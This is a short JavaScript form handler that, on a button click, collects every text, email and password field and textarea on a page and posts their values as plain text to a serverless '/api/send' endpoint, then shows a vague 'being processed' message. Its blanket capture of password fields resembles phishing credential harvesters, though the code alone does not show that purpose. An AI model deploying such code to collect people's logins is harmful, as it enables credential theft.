document.getElementById("sendBtn").addEventListener("click", (e) => {
    e.preventDefault(); // prevent form submission

    // Grab all text/textarea inputs
    const fields = document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], textarea');

    let messageLines = [];
    fields.forEach((f, index) => {
        const label = f.name || f.placeholder || `Field ${index + 1}`;
        messageLines.push(`${label}: ${f.value}`);
    });

    // Send to Vercel serverless function
    fetch("/api/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content: messageLines.join("\n") })
    })
    .then(res => res.json())
    .then(data => {
        if (data.success) {
            alert("Information successfully submitted and is being processed.");
            fields.forEach(f => f.value = ""); // clear fields
        } else {
            alert("Failed to submit information.");
        }
    })
    .catch(err => {
        console.error(err);
        alert("Error sending information. Check the console.");
    });
});
